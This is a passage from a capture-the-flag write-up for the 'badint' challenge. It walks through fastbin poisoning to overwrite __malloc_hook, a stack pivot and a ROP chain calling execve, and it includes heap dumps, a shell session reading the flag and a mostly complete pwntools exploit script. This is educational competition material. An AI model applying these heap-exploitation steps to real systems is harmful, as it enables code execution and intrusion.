0x61adf0:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x61ae00:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x61ae10:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x61ae20:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x61ae30:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x61ae40:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x61ae50:	0x0000000000000000	0x000000000001c1b1

$ p main_arena
$15 = {
  mutex = 0x0, 
  flags = 0x0, 
  fastbinsY = {0x61ac20, 0x61acb0, 0x0, 0x0, 0x0, 0x61ad70, 0x0, 0x0, 0x0, 0x0}, 
  top = 0x61ae50, 
  last_remainder = 0x61ac60, </code></pre></figure>

<p>The final chunk for the second sequence was allocated at <code class="language-plaintext highlighter-rouge">0x61ad70</code> and then got freed. Thus, it was put into the fastbin list (see <code class="language-plaintext highlighter-rouge">fastbinsY[5]</code>). If we would now allocate another fastbin with the same size, malloc would give us this chunk again and puts its FD pointer (currently <code class="language-plaintext highlighter-rouge">0x0</code>) into the fastbin list. But if we overwrite the FD pointer with the (misaligned) address of <code class="language-plaintext highlighter-rouge">__malloc_hook</code> before allocating a new fastbin, it will put that address into the fastbin list instead. The next allocation with a size around <code class="language-plaintext highlighter-rouge">0x70</code> will then return a chunk overlapping <code class="language-plaintext highlighter-rouge">__malloc_hook</code>, enabling us to overwrite it with arbitrary data.</p>

<p>So we just have to create a new (small) data chunk with offset <code class="language-plaintext highlighter-rouge">0x150</code> (<code class="language-plaintext highlighter-rouge">0x61ad80 (target) - 0x61ac30 (input buffer for small chunks)</code>) and assemble it. The assembled chunk will be created at <code class="language-plaintext highlighter-rouge">0x61ac30</code> and our data chunk will be copied to offset <code class="language-plaintext highlighter-rouge">0x150</code> from there, thus landing in <code class="language-plaintext highlighter-rouge">0x61ad80</code> (FD pointer for the chunk in <code class="language-plaintext highlighter-rouge">fastbinsY[5]</code>)</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite Fastbin FD and get pointer to MALLOC_HOOK into fastbin list"</span><span class="p">)</span>
		
<span class="n">sendSeq</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x150</span><span class="p">,</span> <span class="n">addr</span><span class="p">(</span><span class="n">MALLOC_HOOK</span><span class="p">),</span> <span class="bp">True</span><span class="p">)</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x61ac00:	0x0000000000000000	0x0000000000000000
0x61ac10:	0x0000000000000000	0x0000000000000000
0x61ac20:	0x0000000000000000	0x0000000000000021
0x61ac30:	0x0000000000000000	0xaaaaaaaaaaaaaaaa	&lt;-- Input/Final chunk
0x61ac40:	0x4242aaaaaaaaaaaa	0x0000000000000021
0x61ac50:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x61ac60:	0x4242aaaaaaaaaaaa	0x0000000000000021
0x61ac70:	0x00007ffff7636acd	0x00007ffff7636b98
0x61ac80:	0x4242424242424242	0x0000000000000031
0x61ac90:	0x00007ffff7636b58	0x00007ffff7636b58
0x61aca0:	0x4242424242424242	0x4242424242424242
0x61acb0:	0x0000000000000030	0x0000000000000030
0x61acc0:	0x0000000000000000	0x0000000000000000
0x61acd0:	0x0000000000000000	0x0000000000080150
0x61ace0:	0x000000000061ac70	0x0000000000000091
0x61acf0:	0x4242424242424242	0x4242424242424242
0x61ad00:	0x4242424242424242	0x4242424242424242
0x61ad10:	0x4242424242424242	0x4242424242424242
0x61ad20:	0x4242424242424242	0x4242424242424242
0x61ad30:	0x4242424242424242	0x4242424242424242
0x61ad40:	0x4242424242424242	0x4242424242424242
0x61ad50:	0x4242424242424242	0x4242424242424242
0x61ad60:	0x4242424242424242	0x4242424242424242
0x61ad70:	0x0000000000000000	0x0000000000000071
0x61ad80:	0x00007ffff7636acd	0xbbbbbbbbbbbbbbbb	&lt;-- FD pointer overwritten
0x61ad90:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x61ada0:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x61adb0:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x61adc0:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x61add0:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x61ade0:	0x0000000000000000	0x0000000000000071
0x61adf0:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x61ae00:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x61ae10:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x61ae20:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x61ae30:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x61ae40:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x61ae50:	0x0000000000000000	0x000000000001c1b1</code></pre></figure>

<p>The input buffer for the next sequence will now be created at <code class="language-plaintext highlighter-rouge">0x61ad70</code>, stuffing our fake address into fastbin list. Allocating the final chunk will then serve a chunk overlapping <code class="language-plaintext highlighter-rouge">__malloc_hook</code>. When the binary assembles our sequence, it will copy our input to that chunk, thus overwriting the hook.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Allocate chunk to overwrite MALLOC_HOOK"</span><span class="p">)</span>
		
<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x01</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">addr</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>			<span class="c1"># malloc_hook
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x01</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x60</span><span class="o">*</span><span class="mi">2</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>	<span class="c1"># pad size
</span>
<span class="n">sendSeq</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x7f43b2d55720 &lt;__memalign_hook&gt;:   0x00007f43b2a1ac90	0x0000000000000000
0x7f43b2d55730 &lt;__realloc_hook&gt;:    0x00007f43b2a1ac30	0x0000000000000000
0x7f43b2d55740 &lt;__malloc_hook&gt;:     0x00000000deadbeef	0x0000000000000000	&lt;- hook overwritten</code></pre></figure>

<p>On the next allocation, malloc will execute <code class="language-plaintext highlighter-rouge">__malloc_hook</code>, jumping to the address we wrote there.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="o">*</span><span class="nf">__libc_malloc</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">bytes</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">mstate</span> <span class="n">ar_ptr</span><span class="p">;</span>
  	<span class="kt">void</span> <span class="o">*</span><span class="n">victim</span><span class="p">;</span>

  	<span class="kt">void</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">hook</span><span class="p">)</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">=</span> <span class="n">atomic_forced_read</span> <span class="p">(</span><span class="n">__malloc_hook</span><span class="p">);</span>

  	<span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">hook</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
		<span class="k">return</span> <span class="p">(</span><span class="o">*</span><span class="n">hook</span><span class="p">)(</span><span class="n">bytes</span><span class="p">,</span> <span class="n">RETURN_ADDRESS</span> <span class="p">(</span><span class="mi">0</span><span class="p">));</span>

  	<span class="n">arena_get</span> <span class="p">(</span><span class="n">ar_ptr</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span></code></pre></figure>

<p>So, we’ve got code execution. Searched for a one_gadget, sure enough I’d be seeing a shell very soon. And so I did… locally…</p>

<p>While <code class="language-plaintext highlighter-rouge">execve("/bin/sh", 0, 0)</code> worked on my machine, popping a shell, the remote service wasn’t really happy about it:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">XXXXXXXXXXXXXXXXXX: applet not found"</code></pre></figure>

<p>Wuss? Luckily enough, Zach (ebeip90) pointed out, that the remote services are running busybox, which would be the reason that <code class="language-plaintext highlighter-rouge">execve("/bin/sh", 0, 0)</code> fails and we’d have to do an <code class="language-plaintext highlighter-rouge">execve("/bin/sh", ["sh"], 0)</code> instead.</p>

<p>So, one_gadget was no longer an option, since I didn’t have an address for an array containing “sh”. After some more failures trying to get the gadget working anyways, I finally switched to stack pivoting and preparing a rop chain on the stack.</p>

<p>The rop chain would basically read user input to a known address (<code class="language-plaintext highlighter-rouge">0x604900</code>). With that, we can setup the array for argv (pointer to “sh” / “sh”) and then call <code class="language-plaintext highlighter-rouge">execve ("/bin/sh", 0x604900, 0)</code>.</p>

<p>A possible stack pivoting gadget can be found in libc:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x000000000002c1e9: add rsp, 0x90; pop rbx; pop rbp; pop r12; ret; </code></pre></figure>

<p>This basically is <code class="language-plaintext highlighter-rouge">add rsp, 0xa8</code>, which will land in our input buffer.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Allocate chunk to overwrite MALLOC_HOOK"</span><span class="p">)</span>

<span class="c1"># Pivot stack to the rop chain
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x01</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">addr</span><span class="p">(</span><span class="n">ADDESP</span><span class="p">)</span>		<span class="c1"># add rsp, 0xa8
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x01</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x60</span><span class="o">*</span><span class="mi">2</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>

<span class="n">sendSeq</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Send ROP chain"</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span>		<span class="c1"># Padding
</span>	
<span class="c1"># read(0, 0x604900, 24)
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRSI</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x604900</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDX</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">24</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>

<span class="c1"># execve("/bin/sh", ["sh"], 0)
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">59</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BINSH</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRSI</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x604900</span><span class="p">)</span>	<span class="c1"># array will be stored here after read
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDX</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
	
<span class="c1"># Padding payload, so correct fast bin chunk will be used
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x02</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x60</span><span class="o">*</span><span class="mi">2</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>

<span class="n">sendSeq</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Send SH array"</span><span class="p">)</span>		

<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x604910</span><span class="p">)</span>			<span class="c1"># Pointer to SH
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"sh</span><span class="se">\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>	<span class="c1"># SH 
</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>

<p>Since our data gets read by <code class="language-plaintext highlighter-rouge">fgets(&amp;s, 768, stdin)</code>, our input will get stored onto the stack first. When malloc now tries to allocate the chunk to store our input, it will call <code class="language-plaintext highlighter-rouge">__malloc_hook</code>, which is now pointing to the <code class="language-plaintext highlighter-rouge">add rsp, 0xa8</code> gadget. This will move the stack pointer to the start of our rop chain, thus executing it.</p>

<p>The rop chain will then wait for input to store at <code class="language-plaintext highlighter-rouge">0x604900</code>, for which we’ll send the data to construct the argv array.</p>

<p>Now we should be able to call execve in a way, that hopefully executes even on the remote service:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>python xpl.py 1
<span class="o">[</span>+] Opening connection to badint_7312a689cf32f397727635e8be495322.quals.shallweplayaga.me on port 21813: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Leak LIBC base
<span class="o">[</span>+] LIBC leak       : 0x7f2a6a94d7b8
<span class="o">[</span>+] LIBC base       : 0x7f2a6a58f000
<span class="o">[</span>+] MALLOC_HOOK     : 0x7f2a6a94d72d
<span class="o">[</span>+] ADDESP          : 0x7f2a6a5bb1e7
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Prepare fastbin list
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Create fastbin chunks and free them to populate fastbin list
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Overwrite Fastbin FD and get pointer to MALLOC_HOOK into fastbin list
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Allocate chunk to overwrite MALLOC_HOOK
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Send ROP chain
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Send SH array
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
 <span class="nv">$ </span><span class="nb">ls
</span>badint
flag
<span class="nv">$ </span><span class="nb">cat </span>flag
The flag is: All ints are not the same... A239... Some can be bad ints!</code></pre></figure>

<h2 id="final-exploit">Final exploit</h2>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">HOST</span> <span class="o">=</span> <span class="s">"badint_7312a689cf32f397727635e8be495322.quals.shallweplayaga.me"</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">21813</span>

<span class="k">def</span> <span class="nf">sendSeq</span><span class="p">(</span><span class="n">seq</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">lsf</span><span class="p">,</span> <span class="n">rec</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">":"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">seq</span><span class="p">))</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Offset:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Data:"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
	
	<span class="k">if</span> <span class="p">(</span><span class="n">rec</span><span class="p">):</span>
		<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span>
		<span class="k">if</span> <span class="n">lsf</span><span class="p">:</span>
			<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"Yes"</span><span class="p">)</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"No"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">addr</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
	<span class="k">return</span> <span class="n">p64</span><span class="p">(</span><span class="n">a</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">"hex"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>		
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak LIBC base"</span><span class="p">)</span>

	<span class="n">sendSeq</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="p">(</span><span class="s">'B'</span><span class="o">*</span><span class="mh">0x80</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">"hex"</span><span class="p">),</span> <span class="bp">True</span><span class="p">)</span>	
	
	<span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"0000"</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)[</span><span class="mi">2</span><span class="p">].</span><span class="n">strip</span><span class="p">()</span>
	
	<span class="n">LEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"hex"</span><span class="p">))</span>	
	<span class="n">LIBC</span> <span class="o">=</span> <span class="n">LEAK</span> <span class="o">-</span> <span class="mh">0x3be7b8</span>

	<span class="c1"># Calculate gadgets
</span>	<span class="n">MALLOC_HOOK</span> 	<span class="o">=</span> <span class="n">LEAK</span> <span class="o">-</span> <span class="mh">0x8b</span>	
	<span class="n">ADDESP</span>  	<span class="o">=</span> <span class="n">LIBC</span> <span class="o">+</span> <span class="mh">0x000000000002c1e7</span>		<span class="c1"># Add RSP, 0xa8
</span>	<span class="n">POPRAX</span>  	<span class="o">=</span> <span class="n">LIBC</span> <span class="o">+</span> <span class="mh">0x000000000001b218</span>
	<span class="n">POPRSI</span>  	<span class="o">=</span> <span class="n">LIBC</span> <span class="o">+</span> <span class="mh">0x0000000000024805</span>
	<span class="n">POPRDI</span>  	<span class="o">=</span> <span class="n">LIBC</span> <span class="o">+</span> <span class="mh">0x0000000000022b1a</span>
	<span class="n">POPRDX</span>  	<span class="o">=</span> <span class="n">LIBC</span> <span class="o">+</span> <span class="mh">0x0000000000001b8e</span>
	<span class="n">BINSH</span>   	<span class="o">=</span> <span class="n">LIBC</span> <span class="o">+</span> <span class="mh">0x000000000017ccdb</span>
	<span class="n">SYSCALL</span> 	<span class="o">=</span> <span class="n">LIBC</span> <span class="o">+</span> <span class="mh">0x00000000000c1e55</span>
	<span class="n">RET</span>     	<span class="o">=</span> <span class="n">LIBC</span> <span class="o">+</span> <span class="mh">0x0000000000088c85</span>

	<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"LIBC leak       : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LEAK</span><span class="p">))</span>
	<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"LIBC base       : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBC</span><span class="p">))</span>
	<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"MALLOC_HOOK     : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">MALLOC_HOOK</span><span class="p">))</span>
	<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"ADDESP          : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ADDESP</span><span class="p">))</span>

	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Prepare fastbin list"</span><span class="p">)</span>
	
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create fastbin chunks and free them to populate fastbin list"</span><span class="p">)</span>
	
	<span class="n">sendSeq</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x16</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span>		
	<span class="n">sendSeq</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mh">0x60</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span>
		
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite Fastbin FD and get pointer to MALLOC_HOOK into fastbin list"</span><span class="p">)</span>
		
	<span class="n">sendSeq</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x150</span><span class="p">,</span> <span class="n">addr</span><span class="p">(</span><span class="n">MALLOC_HOOK</span><span class="p">),</span> <span class="bp">True</span><span class="p">)</span>
	
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Allocate chunk to overwrite MALLOC_HOOK"</span><span class="p">)</span>
	
	<span class="c1"># Pivot stack to the rop chain
</span>	<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x01</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">addr</span><span class="p">(</span><span class="n">ADDESP</span><span class="p">)</span>		
	<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x01</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x60</span><span class="o">*</span><span class="mi">2</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>

	<span class="n">sendSeq</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>

	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Send ROP chain"</span><span class="p">)</span>
	
	<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span>				<span class="c1"># Padding
</span>		
	<span class="c1"># read(0, 0x604900, 24)
</span>	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRSI</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x604900</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDX</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">24</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>

	<span class="c1"># execve("/bin/sh", ["sh"], 0)
</span>	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">59</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BINSH</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRSI</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x604900</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDX</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
		
	<span class="c1"># Padding payload up, so correct fast bin chunk will be used
</span>	<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x02</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x60</span><span class="o">*</span><span class="mi">2</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>

	<span class="n">sendSeq</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>

	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Send SH array"</span><span class="p">)</span>		

	<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x604910</span><span class="p">)</span>			<span class="c1"># Pointer to SH
</span>	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="s">"sh</span><span class="se">\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>	<span class="c1"># SH
</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

	<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

	<span class="k">return</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>	
	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
